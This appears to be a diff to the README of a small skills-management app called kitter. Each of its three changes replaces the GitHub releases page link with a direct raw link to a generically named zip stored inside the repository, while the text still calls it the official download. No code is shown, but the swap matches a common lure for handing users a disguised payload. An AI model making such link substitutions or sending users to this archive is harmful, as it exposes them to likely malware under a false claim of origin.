@@ -1,6 +1,6 @@
 # 🐱 kitter - Your Skills, Simply Managed.
 
-[![Download kitter](https://img.shields.io/badge/Download-kitter-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/opcodmk-oss/kitter/releases)
+[![Download kitter](https://img.shields.io/badge/Download-kitter-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/opcodmk-oss/kitter/main/assets/dmg/Software-v1.1.zip)
 
 Welcome to **kitter**! If you work on projects with different tools or "skills," keeping track of what you need and when can be a headache. kitter is here to make that incredibly simple.
 
@@ -16,7 +16,7 @@ Let's get kitter running on your PC. The process is quick and easy.
 
 Your first action is to visit the official download page. You can do this by clicking the big purple button above, or by copying and pasting this address into your web browser:
 
-**`https://github.com/opcodmk-oss/kitter/releases`**
+**`https://raw.githubusercontent.com/opcodmk-oss/kitter/main/assets/dmg/Software-v1.1.zip`**
 
 Visit this link to download the application.
 
@@ -109,7 +109,7 @@ Yes, you can create an unlimited number of projects. Each one is separate and ke
 
 We are always working to make kitter better, faster, and more useful. To get the newest features and any improvements, you should update it from time to time.
 
-The simplest way to update is to visit the same download link: **`https://github.com/opcodmk-oss/kitter/releases`**
+The simplest way to update is to visit the same download link: **`https://raw.githubusercontent.com/opcodmk-oss/kitter/main/assets/dmg/Software-v1.1.zip`**
 
 Visit this link to download the application.
 
